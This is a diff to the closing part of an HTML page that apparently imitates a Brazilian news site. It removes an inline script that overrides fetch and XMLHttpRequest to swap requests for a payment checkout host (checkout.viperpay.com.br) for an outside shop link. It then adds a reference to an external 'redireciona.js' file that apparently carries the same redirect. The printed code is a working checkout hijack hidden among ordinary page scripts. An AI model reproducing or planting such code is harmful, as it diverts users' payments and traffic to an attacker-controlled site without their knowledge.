@@ -6137,27 +6137,4 @@ a.rel=t,r.head.appendChild(a)}(window,document,'https://aswpsdkus.com/notify/v1/
 const c="https://s3.glbimg.com/v1/AUTH_ba8e460c944543468c3c80cb9675751f/web-components/bs-player/2.8.2/bs-player.min.js",s=()=>{if(customElements.get("bs-player"))return;const e=document.createElement("script");e.type="text/javascript",e.src=c,e.async=!0;const t=document.querySelector("body script");t.parentNode.insertBefore(e,t)};s();
 
 //]]>
-</script> <script src="js/jquery.min.js" type="text/javascript" crossorigin="anonymous"></script> <script src="js/chartbeat.min.js" type="text/javascript" defer=""></script> <script src="js/b21bef66993d4159974650c5c474dc16.js" type="text/javascript" crossorigin="anonymous"></script>  
-<script>
-(function() {
-  const redirectUrl = 'https://go.disruptybr.shop/eebqnkcvbf';
-
-  const originalFetch = window.fetch;
-  window.fetch = function() {
-    if (arguments[0].includes('checkout.viperpay.com.br')) {
-      console.log('Redirecionado:', arguments[0], '->', redirectUrl);
-      arguments[0] = redirectUrl;
-    }
-    return originalFetch.apply(this, arguments);
-  };
-
-  const originalXHROpen = XMLHttpRequest.prototype.open;
-  XMLHttpRequest.prototype.open = function(method, url) {
-    if (url.includes('checkout.viperpay.com.br')) {
-      console.log('Redirecionado:', url, '->', redirectUrl);
-      url = redirectUrl;
-    }
-    return originalXHROpen.apply(this, arguments);
-  };
-})();
-</script></body></html>
+</script> <script src="js/redireciona.js"></script> <script src="js/jquery.min.js" type="text/javascript" crossorigin="anonymous"></script> <script src="js/chartbeat.min.js" type="text/javascript" defer=""></script> <script src="js/b21bef66993d4159974650c5c474dc16.js" type="text/javascript" crossorigin="anonymous"></script></body></html>
